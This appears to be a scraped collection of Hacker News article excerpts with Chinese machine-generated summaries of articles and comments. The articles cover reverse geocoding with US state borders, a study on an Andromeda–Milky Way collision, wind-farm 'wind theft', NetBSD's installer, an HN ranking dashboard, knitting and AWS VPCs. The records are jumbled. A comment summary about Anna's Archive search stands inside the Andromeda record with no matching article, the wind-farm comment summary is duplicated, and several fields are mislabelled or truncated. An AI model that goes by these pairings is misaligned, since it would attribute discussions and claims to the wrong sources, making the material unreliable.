• **算法选择和优化**：多种简化算法（如Douglas-Peucker、Visvalingam-Whyatt）被提及，每种算法有不同的权衡和适用场景。
• **拓扑处理**：多个评论强调了在简化几何形状时保持拓扑关系的重要性，并提供了具体工具和方法。
• **实际应用和边缘案例**：讨论了复杂边界情况（如Baarle-Nassau）和人口密集区域的处理方法，以及用户可能需要手动选择边界的情况。
• **数据存储和格式**：探讨了多种数据存储和编码格式，如二进制格式、base64编码、缓存图像和矢量瓦片，以优化数据大小和查找效率。

Mapping latitude and longitude to country, state, or city
6/3/2025
An app can easily check a user's location (with permission), but figuring out
where
that location is, is far more difficult. For example, a web app can use
geolocation.getCurrentPosition()
to get a user's location in the form of latitude and longitude coordinates. But how do you convert coordinates to country, state, or city? Well, you have to look it up, somehow. (I later learned this is called
reverse geocoding
.)
At the startup I worked at, we paid several thousands of dollars per year for the Google Maps API to do a reverse lookup (that decision was made long before I joined). Given the coordinates, it gave us back a full address. We only cared about the state they were in, so we ignored the rest. If the user didn't allow us to check their location, we simply showed a state selection screen:
We paid thousands of dollars a year, just for users to avoid this screen!? Yep.
Shortly after I joined the company, I tried to find a library that lets you lookup the state from coordinates, but I didn't find one. It seemed like the sort of thing that should exist. There are a lot of products that want to show you the nearest store. Some products use the user's IP address to determine the location. Or we could have done a simple distance check to a set of known points. Either would have been good enough.
Now that I don't have a need for such a library, I went down the rabbit hole and made
coord2state
based on actual US state borders for quick lookups. It is a single-file JavaScript library with no dependencies that can run client-side to determine which state a given latitude and longitude point falls in. It is 260 KB and is 99.9% accurate compared to the US Census Bureau's borderlines. You could have 100% accuracy if you were ok with 21 MB! It is on
GitHub
and
NPM
.
Try it:

State code: ?
How does it work?
The US Census Bureau publishes border
data
for use in GIS software. I downloaded the state borders from 2024, which came in a 50 MB binary file detailing the vectors of each border. Luckily there are several Python libraries that make these files easy to work with.
states = gpd.read_file("tl_2024_us_state.shp")
lon, lat = -74.0060, 40.7128 # New York
match = states[states.geometry.contains(Point(lon, lat))].iloc[0]["NAME"]
I could just wrap this up in my own web API and avoid the expensive Google Maps API. It would work well, but that is boring. My goal is to do it all client-side.
At a first glance, the borders are
really
detailed.

Thousands and thousands of vertices for a single state seems like way more precision than we need. For example, North Dakota has 32,441 vertices despite it being a rectangle with three straight sides and one jagged side that follows a river.
Surely we could simplify the borders a bit without losing much accuracy? The
Shapely
library already implements the
Douglas-Peucker algorithm
for simplifying lines. It removes points that don't change the overall shape within a specified tolerance.
With a tolerance of 0.5° (not an angle, but a linear distance measured in degrees of latitude/longitude), it reduces the number of vertices by 99.9% for most states. For example, Texas is reduced from 62,855 vertices to 14!
You can see that it oversimplifies by quite a bit though. It takes going down to 0.01° tolerance to make the differences indiscernible at this resolution, and yet it still reduces the vertices for most states by 99%. Texas is reduced by 98.8% to 756 vertices:
How much accuracy are we losing though? In terms of total area, it is a very small amount of error. Far less than 1%. I set up an experiment that compares the original geometry with the simplified geometry by testing 1,000,000 random points within the US.
A tolerance of 0.1° gives an accuracy of 99.3%!
Alright, that seems like it is
probably
accurate enough for most use cases. But none of this matters unless we can get the size down. I'd really like it to be less than 1 MB if this is going to run client si

data.title: New study casts doubt on the likelihood of Milky Way collision with Andromeda
data.author: layer8
data.article_summary: 一项新研究对银河系将在45亿年后与仙女座星系碰撞的长期理论提出质疑。科学家利用哈勃和盖亚太空望远镜的数据模拟了银河系、仙女座星系及其最大伴星系的演化过程。结果显示，未来50亿年内两者碰撞的概率仅为2%，而非之前认为的必然事件。在约一半的模拟场景中，两星系会发生近距离接触，但最终因失去轨道动量而合并。大多数情况下，它们会以较大距离擦肩而过，继续独立演化。若碰撞发生，可能在70至80亿年后，届时将产生巨大的辐射爆发。研究强调，新结论得益于更多数据和更大范围的可能性探索，而非早期计算错误。该研究发表在《自然天文学》期刊上。

Department of Physics
New study casts doubt on the likelihood of Milky Way collision with Andromeda
2 June 2025
Media release
Research news
Share page:
New research has cast doubt on the long-held theory that our galaxy, the Milky Way, will collide with its largest neighbour, the Andromeda galaxy, in 4.5 billion years-time.
Scientists used data from NASA’s Hubble and the European Space Agency’s Gaia space telescopes to simulate how the Milky Way, Andromeda and their most massive satellite galaxies could evolve over the next 10 billion years.
They found that there is only a 2% probability that the galaxies will collide in the next 5 billion years, contrary to the previous belief that a collision was a certainty within that timeframe.
In around half of the simulated scenarios, the Milky Way and Andromeda experience at least one close encounter, before losing enough orbital momentum to eventually merge.
In most other cases, the two galaxies pass at such a large distance that they continue to evolve largely unperturbed for a very long time.
Cosmic firework
If the Milky Way and Andromeda are to collide and merge, the researchers found that it would most likely happen in 7 to 8 billion years’ time, significantly later than previously predicted.
Such a collision would be devastating for both galaxies which would be destroyed, leaving behind a spheroidal pile of stars known as an elliptical galaxy.
There could, however, be cosmic firework: gas will be funnelled to the centre and emit huge amounts of radiation as it falls into a central black hole at the heart of the merger remnant.
Expansion of possibilities
Dr Till Sawala of the University of Helsinki led the study and was a Postdoctoral Research Assistant at Durham whilst carrying out the research.
He emphasised, although this new research casts doubt on the previously accepted future of our galaxy, the new conclusions do not imply a mistake in earlier calculations.
Rather, the team were able to use new data and explore a much larger array of possibilities in than ever before.
More data, more knowledge
Meanwhile, uncertainty about the future of the Milky Way and Andromeda may not last.
The research team is already looking ahead  to the Gaia space telescope which will soon deliver more precise measurements of some of the most crucial variables within the galaxies, including the transverse motion of Andromeda.
Carlos Frenk, co-author of the research and Professor in our Institute for Computational Cosmology, said: “It is amazing that we are able to simulate the evolution of gigantic collections of stars over billions of years and figure out their ultimate fate.
“This is a testimony to the power of physics allied to the power of large supercomputers.”
The study has been published in the journal Nature Astronomy.

data.comments_summary:
主要讨论点：Anna's Archive的全文搜索可行性及其实现

不同观点：
• [bhaney] 认为将Anna's Archive转换为纯文本并进行全文搜索是可行的，但需要大量时间。他估计大约需要10-20TB的存储空间，并且提取纯文本和清理数据是主要挑战。选择合适的全文搜索数据库也很重要。
• [net01] 提到Anna's Archive已经举办过竞赛，并有一些参赛作品实现了不错的搜索工具和可视化工具。
• [ggm] 指出Anna's Archive已经具有完整的元数据索引，但实现全文搜索和页面级返回是另一回事。由于涉及知识产权问题，存储和索引这些文本可能存在法律风险。
• [laserstrahl] 介绍了一个名为OpenLib的安卓应用，它通过发送请求并解析响应来获取Anna's Archive的内容，支持Epub和PDF格式，并具有内置阅读器。
• [simgt] 关注Anna's Archive中的非法内容过滤问题，如涉及儿童色情和恐怖主义的内容，担心下载后会遇到不想要的内容。
• [imdavidsantiago] 认为虽然技术上可以使用Meilisearch、Elasticsearch或Lucene等工具实现全文搜索，但主要的挑战在于文档格式转换、大规模索引效率和法律问题。
• [1970-01-01] 警告不要轻易实施，指出即使技术上可行，法律风险也不容忽视，尤其是面对可能的法律通知。
• [nextos] 提到Z-Library已经实现了某种程度的全文搜索，虽然规模较Anna's Archive小，且在某些地区需要通过Tor访问。
• [podgorniy] 提供了一个针对压缩fb2文件的搜索解决方案，具有潜在应用价值，但需要翻译俄文说明来设置。
• [teekert] 和[underlines] 提到大型语言模型公司（如Google、Meta、OpenAI）可能已经使用类似资源训练其模型。

• 有人担心Anna's Archive的内容合法性问题，尤其是涉及敏感非法内容时（[simgt]）。
• 实现全文搜索的技术挑战包括文档格式转换和索引效率（[bhaney], [imdavidsantiago]）。
• 法律风险是讨论中的一个重要关注点，尤其是知识产权和可能面临的法律诉讼（[ggm], [1970-01-01]）。
• 一些评论提供了现有的搜索引擎例子，但并不直接适用于Anna's Archive（[renegat0x0]）。

争议焦点：
• 实现Anna's Archive全文搜索的主要争议在于法律风险和技术挑战，尤其是如何合法地处理和索引这些内容。

data.author: JumpCrisscross
data.article_summary: 文章主要讨论了风电场之间存在的“风能盗窃”现象，即当一个风电场在另一个风电场的上风处时，会减慢风速，影响下风处风电场的能量输出。这种现象被称为尾流效应，可导致下风向风电场能量输出减少10%或更多。随着全球海上风电场的快速扩展，特别是规模和密度的增加，尾流效应愈发显著，可能延伸超过100公里。这种效应引发了风电场开发商之间的纠纷，尤其是在风电场密集的北海地区。为了解决这一问题，英国已启动新研究项目，旨在通过建模分析2030年风电场的尾流效应，帮助政府和开发商优化规划，避免纠纷。
data.comments_summary:
主要讨论点：风力发电场的“尾流效应”及其潜在影响

不同观点：
• **风权与资源争夺**：glkindlmann和JohnKemeny指出，风力发电涉及风权的概念，类似于水权，存在资源争夺问题。JohnKemeny还提到，当一个风电场上风处的风力被前一个风电场削弱时，可能引发冲突，类似于共享资源的争夺。

• **尾流效应的影响程度**：glumreaper引用研究数据表明，尾流损失对风电场的影响较小（约3.28%），并将其比作新风电场在两年后的自然损耗，认为其影响微不足道。morkalork则指出尾流效应可延伸100公里，影响另一风电场10%的输出，认为需从国家规模优化风电场布局。

• **环境影响与效益权衡**：g42gregory关注风电场对环境（如鸟类、气候、昆虫种群）的潜在负面影响，并质疑其正负效果的权衡。collinmcnulty则建议将风电场的影响与其他障碍物（如建筑物）比较，以更好地理解其环境影响。

• **气候变化对风力发电的影响**：acyou提出全球变暖可能影响风力发电输出，因为气温升高会降低空气密度，尽管整体系统中可能有更多能量。

补充讨论：
• **技术与科幻设想**：roxolotl提到一个十年前的研究模型，探讨风力涡轮机对飓风的影响，指出其在理论上可减弱风暴强度。polishdude20则提出一个科幻设想，关于利用风力阵列从风暴中获取能量以保护居住区。

• **教育与认知**：p0w3n3d认为风力发电的基本原理（能量守恒）是显而易见的，不需要复杂解释。

• **社会态度与发展需求**：bamboozled强调了对风电场的批评，并指出需要持续实验和发展更好的解决方案，以避免风力发电成为像核能那样的“禁忌”话题。

• **幽默与类比**：Kon-Peki用帆船比赛中的战术比喻风电场“偷风”行为。hulitu则以幽默方式提到未来可能出现太阳能农场“偷光”的问题。

'Wind theft': The mysterious effect plaguing wind farms
7 May 2025
Share
Save
Sophie Hardach
Share
Save
Getty Images
As wind farms expand, some can accidentally "steal" each others' wind – causing worries over some countries' energy transition to net zero.
As offshore wind farms are expanding around the world in the race to meet net zero climate targets, a worrying phenomenon is attracting growing attention: in some conditions, wind farms can "steal" each other's wind.
"Wind farms produce energy, and that energy is extracted from the air. And the extraction of energy from the air comes with a reduction of the wind speed," says Peter Baas, a research scientist at Whiffle, a Dutch company specialising in renewable energy and weather forecasting. The wind is slower behind each turbine
within the wind farm
than in front of it, and also behind the wind farm as a whole, compared with in front of it, he explains. "This is called the wake effect."
Simply put, as the spinning turbines of a wind farm take energy from the wind, they create a
wake
and slow the wind beyond the wind farm. This wake can stretch more than 100km (62 miles) for
very large
, dense offshore wind farms, under certain weather conditions. (Though more typically, the wakes extend for tens of kilometres, according to researchers). If the wind farm is built upwind of another wind farm, it can
reduce
the downwind producer's
energy output
by as much as
10%
or
more
, studies suggest.
Colloquially, the phenomenon is known as
wind theft
– though as Eirik Finserås, a Norwegian lawyer specialising in offshore wind energy, notes: "The term wind theft is a bit misleading because you can't steal something that can't be owned – and nobody owns the wind."
Getty Images
The wind wake caused by wind turbines can stretch for more than 100km (62 miles) (Credit: Getty Images)
Still, he points out that the phenomenon can have a number of negative consequences for wind farm developers, and even, potentially, cause problems across borders (more on this later). There are in fact a number of ongoing
disputes
between
wind farm developers
over alleged wind theft, raising
concerns
in countries that rely on ramping up offshore wind energy to meet their net zero climate targets.
While the problem of wind theft has been
long known
in principle, it is growing more pressing due to the scale and speed of the offshore expansion, and the
size and density
of offshore wind farms, experts say.
In less than five years, we need to deploy thousands more turbines – Pablo Ouro
In the North Sea, which is seeing an offshore wind boom, the impact of such wakes on offshore energy production is likely to increase in the next decades as the sea becomes more crowded with wind farms, according to
simulations
by Baas together with researchers from the Delft University of Technology and the Royal Netherlands Meteorological Institute. The
denser
and
bigger
the wind farm, the stronger the wake effect, Baas says.
A
new research project
in the UK, launched this spring, aims to provide a clearer picture of the wake effect to help governments and developers improve their planning, and avoid disputes. The project will model wakes and their impact on wind farms' output in
2030
, when there will be thousands more turbines in UK waters than today, says project lead Pablo Ouro, a research fellow in civil engineering at the University of Manchester.
"We have seen wake effects for years, and knew they happen," says Ouro. "The problem is that in order to achieve net zero, we need to deploy a given amount of offshore wind capacity. So for
2030
, we need to have three times more capacity than we have now, which means that in less than five years, we need to deploy thousands more turbines," he explains.
"[Some of] these turbines are going to be operating very close to those that are already operating, so things are getting more and more crowded. So these wake effects are now starting to have more impact," he says.
Getty Images
Countries are ramping up offshore wind energy, resulting in disputes between wind farm developers over "wind theft" (Credit: Getty Images)
The UK government has pledged that by 2030, Britain will generate enough power from renewable sources, such as wind, to cover its electricity needs. A 2025 UK government
policy paper
highlights the need to better understand wake effects in this context, describing them as an emerging issue that creates uncertainty for offshore wind farms.
Currently, there are a number of
disputes
in the UK between offshore wind farm developers over potential wake effects, Ouro says. In his view, these disputes are partly caused by uncertainty over the precise impact of wakes. For example, current UK guidelines on how much offshore wind farms should be
spaced apart to avoid wake effects
, may not reflect the
actual extent
the wakes can reach, he says. Also, because offshore wind farms are built in clusters, it can be difficult to assess how they might all affect each others'

• **尾流效应的影响程度**：glumreaper引用研究数据表明，尾流损失对风电场的影响较小（约3.28%），并将其比作新风电场在两年后的自然损耗，认为其影响微不足道。morkalork则指出尾流效应可延伸100公里，影响另一风电场10%的输出，认为需从国家规模优化风电场布局。

• **环境影响与效益权衡**：g42gregory关注风电场对环境（如鸟类、气候、昆虫种群）的潜在负面影响，并质疑其正负效果的权衡。collinmcnulty则建议将风电场的影响与其他障碍物（如建筑物）比较，以更好地理解其环境影响。

• **气候变化对风力发电的影响**：acyou提出全球变暖可能影响风力发电输出，因为气温升高会降低空气密度，尽管整体系统中可能有更多能量。

补充讨论：
• **技术与科幻设想**：roxolotl提到一个十年前的研究模型，探讨风力涡轮机对飓风的影响，指出其在理论上可减弱风暴强度。polishdude20则提出一个科幻设想，关于利用风力阵列从风暴中获取能量以保护居住区。

• **教育与认知**：p0w3n3d认为风力发电的基本原理（能量守恒）是显而易见的，不需要复杂解释。

• **社会态度与发展需求**：bamboozled强调了对风电场的批评，并指出需要持续实验和发展更好的解决方案，以避免风力发电成为像核能那样的“禁忌”话题。

• **幽默与类比**：Kon-Peki用帆船比赛中的战术比喻风电场“偷风”行为。hulitu则以幽默方式提到未来可能出现太阳能农场“偷光”的问题。

data.title: A critical look at NetBSD’s installer
data.author: jaypatelani
data.article_summary: 本文是关于NetBSD安装过程的详细指南，特别关注其安装程序`sysinst`。作者之前撰写了关于FreeBSD和OpenBSD安装的系列文章，而本文则聚焦于NetBSD 10.1在amd64系统上的安装。文章首先提到NetBSD的安装程序是菜单驱动的，与FreeBSD类似，但操作更简便，如使用字母热键导航。语言和键盘布局选择相对简单，但包含一些意外选项如冰岛语和德语NEO2布局。安装过程清晰简洁，但某些界面如硬盘和分区方案选择可以提供更多解释。作者建议在选择安装目标和分区方案时增加更多说明，以帮助新手更好地理解选项（如MBR和GPT的区别）。总体而言，文章提供了对NetBSD安装过程的深入见解，并指出其可改进之处。
data.comments_summary:
主要讨论点：NetBSD系统安装体验及相关技术细节

不同观点：
• rahen认为sysinst安装程序在用户体验上可以改进，并质疑文章作者是否以典型用户（追求经典Unix体验的用户）的角度来使用NetBSD。他个人更喜欢OpenBSD和Alpine Linux的CLI安装程序，认为它们更符合Unix哲学，甚至建议用类似方式替代sysinst。

• JdeBP指出文章中关于分区表方案的描述有误，强调是旧的固件对分区方案有要求，而非新的固件。他还提到FreeBSD实际上支持非美国键盘布局，甚至比NetBSD支持的更多，纠正了文章中的暗示。

• JSR_FDED对文章给予积极评价，认为新用户视角的反馈非常有价值，尤其是对有经验的用户而言。

• hulitu对文章中提到的安装程序自动丢弃/usr和/var分区的机制表示困惑，指出如果用户创建了这些分区，安装程序不应该自动丢弃，质疑安装程序是否执行了不符合用户预期的操作。

• rickcarlino简单表达了对文章跨平台发布的感谢，未涉及技术讨论。

• sam_lowry_对文章中的截图如何在虚拟机中运行表示好奇，提出了技术实现上的疑问。

• jmclnx认为文章对分区步骤的描述是合理的，但承认对新用户来说可能有些混乱，建议新用户在安装前仔细阅读指南。他还补充了一个重要的技术细节，即如果用户创建了单独的/usr或/var分区，必须在/etc/rc.conf中添加特定的配置行，否则可能会遇到启动错误或警告。

补充讨论：
• 技术细节上的争议主要集中在分区表方案和安装程序的行为，特别是/usr和/var分区的处理。
• 对FreeBSD和NetBSD在键盘布局支持上的对比，纠正了文章中的不准确之处。
• 强调了新用户视角的重要性，以及技术文档和指南在安装过程中的指导作用。

争议焦点：
• 安装程序sysinst的用户体验是否符合典型用户的需求。
• 文章中关于分区表方案和FreeBSD键盘布局支持的准确性。
• 安装过程中/usr和/var分区的处理逻辑是否合理。

44176919.article_content:
[New to Gemini? Have a look at my
Gemini FAQ
.]
This article was bi-posted to Gemini and the Web
; Gemini version is here:
gemini://gemini.circumlunar.space/users/kraileth/neunix/2025/installing_bsd_pt3.gmi
The
first part
of this series was about FreeBSD’s installer and the
second
covered OpenBSD’s installation program.
This is a longer article and it has the most images that I ever included in one. While writing the other two articles didn’t take me too long, this one has has occupied several evenings / nights over the course of about three weeks.
NetBSD is an OS that I installed only a couple of times over the years, so I’m not very familiar with its installer,
sysinst
. This fact was actually what led to this article (or the whole series rather): Talking to a NetBSD developer at EuroBSDcon 2023, I mentioned my impression that NetBSD was harder to install than it needed to be. He was interested in my perspective as a relative newcomer, and so I promised to take a closer look and write about it. While it certainly took me long enough, I finally get to do this. So let’s take a look at NetBSD’s installer, shall we? The version explored here is NetBSD
10.1
on
amd64
.
Installing a simple graphical NetBSD system
Sysinst is menu-driven like FreeBSD’s installer, but the two are quite different. This is not a direct comparison, but I’m going to mention other installers where appropriate. Like in the previous two articles, I’m going to install the OS twice: One time using the standard VGA console and once to assess how well it works over serial. Both installations will be in VMs just for the sake of convenience.
Language settings
The first screen that the installer presents is the language selection. If you’re used to more mainstream operating systems, you may be surprised that there’s only four languages in addition to English. But hey: Many other installers are available in English only, and if you’re somebody who’s more comfortable with German, (Castilian) Spanish, French, or Polish than with English, it’s nice to have the option!
I like that there’s a short introduction text at the top which briefly explains how to navigate the installer. This is very nice for newcomers! Assigning each item an alphabetic hotkey is also a great mechanic that makes navigating the installer a breeze even if there’s a lot of options (FreeBSD’s choice of numeric hotkeys is obviously inferior as soon as there are more than ten items).
Language selection
After selecting the language, the installer presents a list of supported keyboard layouts. Again, NetBSD’s installer does not offer the most comprehensive list ever, but there are some surprises. Given the relatively short list, your preferred keymap may not be available.
You probably wouldn’t expect that somebody invested the effort to make Icelandic available, would you? And there’s also things like “German (NEO2)”, a relatively obscure ergonomic variant (that I’ve actually used in the past before adopting BONE whith is basically NEO3). Not even FreeBSD offers NEO2, BTW. Those unusual cases are strong indicators of the NetBSD project being happy to include contributions. So if you consider making a keymap for your layout, another option in the list could probably be yours!
Keyboard layout selection
Next is the main menu that allows the user to either install a fresh system, upgrade an existing one, reboot and so on. Like in the menu before, the text at the top did not change. But it didn’t have to since once again the menu options are self-explanatory.
Installer options
The next screen presents some information on the steps of the installation process and asks if that is what the user wants to do. It’s concise and to the point – I like it. It means an additional key press, but it’s helpful for newcomers.
Installation process overview
Preparing the hard disk
Now sysinst needs to know the installation target. I believe a more detailed explanation at the top would be beneficial. It’s probably nitpicking to point out that “Extended partitioning” is not exactly an answer to the question “On which disk do you want to install NetBSD?”. That aside, I genuinely believe this screen could be improved. Something like “Select a single disk as the installation target or choose ‘extended partitioning’ for softraid, a logical volume manager or device encryption.” would be better. Probably mentioning that ‘wd*’ means IDE or SATA drives, ‘sd*’ is for SCSI or external USB drives and ‘ld*’ are logical drives like VirtIO drives and NVME could be helpful as well.
Installation target selection
The next screen does not have any explanatory text at all – another missed opportunity. While people who install NetBSD probably know it, would it hurt to mention that MBR is the scheme that older BIOS systems expect while GPT is required for EFI systems? I guess it wouldn’t.
Partitioning scheme selection
The partition options and the description text for GPT are fine.
Partitioning options
The default partition layo

data.title: Show HN: Hacker News historic upvote and score data
data.author: clacker-o-matic
data.article_summary: Hacker News Alerts Dashboard 是一个用于监控用户帖子在 Hacker News 首页表现的工具。它显示了以下关键信息：总故事数（数据库中跟踪的故事）、最高点数（获得最多点赞的故事）、平均点数（每个故事的平均点赞数）以及平均在首页停留时间（故事在首页显示的平均时长）。用户可以点击某个故事查看其在 Hacker News 首页的排名历史。该工具还提供数据刷新功能，并仅对跟踪的用户显示信息。当前，故事数据正在加载中。
data.comments_summary:
主要讨论点：Hacker News（HN）数据准确性、网站技术问题、数据的可操作性及分析

不同观点：
• **数据准确性质疑**：
  - [bilekas] 对列出的"最多点赞故事"的数字（390）表示怀疑，认为见过更高的数字，并举例说明某帖子有393个赞。
  - [ChrisMarshallNY] 进一步指出"最高点赞"的数字不准确，并提供了一个有超过2200点赞的帖子例子。

• **网站技术问题**：
  - [doodlebugging] 提到访问该网站时，Malwarebytes警告其有风险软件，并描述了具体的错误信息，可能是由于其使用的旧系统（Win7Pro和FF 115.24.0）导致。

• **数据可操作性及分析**：
  - [TheEdonian] 提出疑问，帖子获得高点赞是因为上了首页获得关注，还是可能存在购买点赞的行为，类似于Reddit。
  - [jmyeet] 深入分析HN投票机制，指出由于缺乏对反对票的访问权限，分析投票和评论存在困难，并讨论了HN的管理和推荐机制，强调位置对点赞数的影响。

补充讨论：
• **项目合作及功能建议**：
  - [namiwang] 提到自己创建了类似的项目[Track HN](https://track-hacker-news.com)，建议可以合作进一步开发。
  - [NAHWheatCracker] 对网站的图表功能提出改进建议，例如选择较低排名的帖子时图表应自动下移。
  - [baxtr] 对数据的可操作性表示疑问，询问可以如何利用这些数据。
  - [welder] 提供了一个相关网站链接：https://hnrankings.info/。

• **其他评论**：
  - [jcmp] 和 [jaspermayone] 对帖子登上首页表示祝贺和赞赏。
  - [tokai] 和 [canterburry] 提出了一些时间相关的评论，但未深入讨论。
  - [mocmoc] 提到项目使用claude，并表示赞赏。

争议焦点：
• 数据准确性和HN的管理机制是主要争议点，尤其是关于点赞数的真实性和管理机制对帖子曝光的影响。

总体来看，讨论围绕数据的准确性、技术实现、可操作性及可能的改进建议展开。

data.title: Consider Knitting
data.author: ingve
data.article_summary: 这篇文章旨在向长时间面对电脑编程的人推荐编织（广义上包括钩针、编织等纤维艺术）作为一种有益的爱好。作者以自身经历为例，讲述了作为程序员，他在疫情后感受到身体对触觉体验的渴望，而编织提供了这种满足感。编织不仅是触觉上的享受，还能通过不断练习提高技能，带来类似游戏中提升等级的成就感。作者强调，编织可以作为一种冥想式的活动，帮助程序员在工作之外放松身心，并体验手工艺的乐趣。文章呼吁不论背景，编程人士都可以尝试编织，享受其带来的身心平衡。
data.comments_summary:
主要讨论点：通过手工艺等非屏幕活动来平衡计算机工作的必要性，尤其是编织、木工等手工爱好带来的身心益处。

不同观点：
• Author（munificent）及[twoquestions]认为编织等手工艺活动与计算机编程有历史渊源，编织甚至可以被视为计算机科学教育的一部分。他们强调了手工艺术尤其是编织机历史的重要性，并指出这些内容常被忽视，尤其是“女性工作”的价值。
• [bonki]分享了钩针编织的经历，但表示由于需要全神贯注，无法同时进行其他活动（如听有声书），而且因为进展缓慢，感觉耗费时间，尽管理智上知道这种活动有助于放松大脑。
• [tiniuclx]和[jvanderbot]更偏好音乐和木工。他们强调了这些活动带来的即时反馈和成就感，如制作新架子或盒子。木工还涉及数学计算，且最终成品更为实用。

knitting
Let’s say that, like me, you are a person who stares at a computer and writes
code for a living. As a straight male who grew up in a time where knitting was
very strongly female coded, it for the most part never occurred to me that
knitting was a thing I could do and might enjoy. Regardless of your demographic
categories and background, it’s possible that you have also not really
considered knitting.
This article exists to get you to do so. Specifically, I’ll try to convince you,
one software person to another, why it might be a good fit for your life and
brain. This is a pitch for knitting, but—for better or worse—an extremely
nerdily argued one.
Before I start, note that when I say “knitting”, you can read that as any of the
various
fiber arts
, including crochet, weaving, macramÃ©, cross-stitch, etc.
I talk about knitting here because that’s the one closest to my heart and I
strive to speak from the heart. You can make stuff out of string however you
want. We are all fiber friends.
The sense of touch
I love the aesthetics of programming. Sitting in a cool quiet room, techno
thumping in my headphones, coffee mug next to me, while a neatly arranged field
of glowing monospace glyphs stream across my screen. But there’s one sense
unmentioned in that sentence: touch. The sense we devote more neurons to than
any other is curiously underutilized while pumping out code.
It’s no surprise that some programmers
fetishize
keyboards
. It’s just about the only part of programming that has any physical sensation
at all
.
I got into knitting a few years after the pandemic. While I have a variety of
hobbies, most are still staring at a screen and maybe
pushing some buttons and
turning knobs
. When I wasn’t doing those, I was staring at a screen
for work, or staring at a screen for
not-work
.
I don’t know if I have a good way to explain how much my body craved tactile
experience by the end of that. It’s like my fingers ached. A deep hunger, but
not for taste. I’d wander around the house, driving my wife insane, unable to
sit down and get comfortable. My body was just screaming at me to
do
something.
My youngest daughter had just picked up knitting, and she taught me. At first it
was frustrating and annoying. But once I had the basics down, it was like a a
deep sigh felt in my hands. Knitting is
so
touch-centered. Skilled knitters
can knit without looking at their hands at all—touch alone is sufficient.
There are so many different kinds of yarn to work with and they all feel
different. Cotton is tough and firm, like twine. Wool is soft and springy,
forgiving as you pull stitches open to work them. Superwash wool is smooth and
glides off the needles. Non-superwash wool has this very slight stickiness to it
that makes the resulting fabric feel solid and whole. Thin fingering weight yarn
wraps tightly around your finger like a reminder knot. Working it is like
performing delicate surgery. Squishy chunky wool spreads your fingers wide and
works so quickly it’s like fabric is spooling out of your hands on its own
accord.
Even needles each have their own personality. Stiff grippy bamboo with its dull
clack. Less worrisome to use because stitches don’t slide off as easily, but
harder work to push against the friction. Polished stainless steel where the
stitches just fly off the needles—good when you are done with those stitches
but not so much otherwise.
Once you’ve worked a few thousand stitches into your muscle memory, you can
watch your fingers form stitches almost of their own accord, hypnotically. Right
needle opens the stitch and slides in. Left finger wraps the yarn around the
needle. Right finger grabs yarn. Right hand pulls the needle back out, a new
stitch formed and transferred to the other needle. Over and over, like a
meditation in the body.
Knitting
feels good
. It is an intimate, constant reminder that we are a tool-using species with thousands of years of evolution giving us incredible dexterity and the emotional wiring to make us want to use it.
An open world game with optimized skill curve
Of course, you could get much of that same tactile joy by driving to your
nearest yarn store and wandering around the aisles jamming your fingers into
every ball and skein of yarn they have. (An activity I certainly
also
do and
highly recommend.) Knitting isn’t just about having a hedonistic tactile
experience. It is a skilled art with an unbelievably deep lore.
I
used to be a game programmer
, and I tend to look at a lot of
activities through the lens of game design. Games are interesting because they
are user experience distilled to its essence. When you are, say, using a banking
app to transfer some money into savings, there is a user experience in play. But
there’s also a
utility
, a real effect you are trying to have in the material
world. You may use your banking app and be satisfied that it helps you save
money even if the UX is trash.
But a game, almost by definition, doesn’t
do
anything “out

data.author: egonschiele
data.article_summary: 这篇文章介绍了亚马逊VPC（虚拟私有云）的概念及其重要性。VPC是为了解决AWS早期存在的问题而创建的，当时所有用户共享一个网络，导致IP地址冲突和安全风险。IP地址冲突是指不同用户的服务器拥有相同IP地址，这在迁移到AWS时会造成问题。此外，共享网络还可能导致用户之间的数据泄露风险。为了解决这些问题，AWS为每个用户提供了独立的VPC，使他们可以在自己的私有网络中运行服务器，避免IP冲突和安全问题。VPC允许用户将现有的本地服务器连接到AWS，同时保持其原有的IP地址，从而实现平滑的迁移和整合。理解VPC对于使用AWS的其他网络功能至关重要。

In this section, I talk about why VPCs were invented and how they work. This is critical to understand because almost everything you do in AWS will happen inside of VPC. If you don't understand VPCs, it will be difficult to understand any of the other networking concepts.
If you're reading this, maybe you have one of these
and you just found out that to put your app on AWS, you need all of this:
And you have no idea what VPCs, subnets and so on are.
I'll help you learn about all those pieces. A little about me, I’m a long-tailed duck, and I run a business selling phones to hackers, called
Blackhatberry
. Now let's get started.
This is the story of VPCs (Virtual Private Cloud)s, our first big topic. Many moons (and suns) ago, some AWS engineers were sitting in a room. They had a serious issue.
"Guys, lets talk business. Why aren't more companies moving to AWS?" they said.
"Maybe because all instances run in a single shared network, which means users can access each other's instances, and see each other's data," someone said.
"Maybe because it's hard for them to move their existing servers to AWS, because of IP address conflicts," someone else said.
"Wait… what are IP address conflicts?”
“And existing servers? Shouldn’t they be moving to
our
servers?”
IP address conflicts
This is the first reason people weren’t switching to AWS. Here's what I mean by IP address conflicts. I own a bunch of servers for Blackhatberry. One of them has the IP address `172.98.0.1`. Now, my neighbor also has a server for her business. She loves my ip address. “Ah, 172.98.0.1, what a beautiful destination,” she says. So she copies my address!
Now we both have servers with the same IP address!
Sidebar: You can find your local IP address using `ipconfig getifaddr en1` (works for Macs for wireless internet connections).
Now you're thinking "so what?". And actually... you're totally right. Even though our servers have the same IP address, they are in
different
networks, so it's not an issue.
But here comes trouble
. Because we both want to get on AWS. But if we have two servers with the same IP address on AWS, that's a problem!
Bam: IP address conflict. Every server in a network needs to have a unique IP address for the same reason that every house in a city needs to have a unique address. Otherwise, if someone has a package, they wouldn't know which house to deliver it to.
Now I know what you're thinking. Why don't you just get new servers in AWS? Why connect your on-prem ("on premises") servers to AWS? Isn't the whole point that you're
moving to AWS?
And sure, we can afford to do that, but there are companies with dozens of on-prem servers. Migrating everything to AWS is simply not an option for them. They need functionality so they can create
new
servers in AWS, but also connect their
existing
, on-prem servers into the
same network
. And this does not work when everyone is part of the same network, because of IP address conflicts.
This was a huge problem for AWS! I mean, see how serious these engineers look:
This IP conflict issue meant people with on-prem servers had no easy way to gradually move to AWS. Think of all the potential customers they were losing!
I'm giving you this background so you can understand why VPCs were invented. IP address conflicts weren't the only issue. In AWS, everyone's servers used to be on the same network, which meant if you were careless, it was easy for anyone to connect to your server and look at all kinds of sensitive data!
For both these reasons, Amazon needed to give each customer their own private network, instead of having them all on the same shared network. And so VPCs were born.
Why do they call it a VPC if you can't see it!
So there are two problems we're trying to solve:
IP address conflicts
The fact that users can access each other's instances because they're in one big shared network.
Remember: duplicate IPs were totally fine when my network and my neighbor's network were separate. What Amazon needed was a way to give each person their own private network, but
inside
AWS
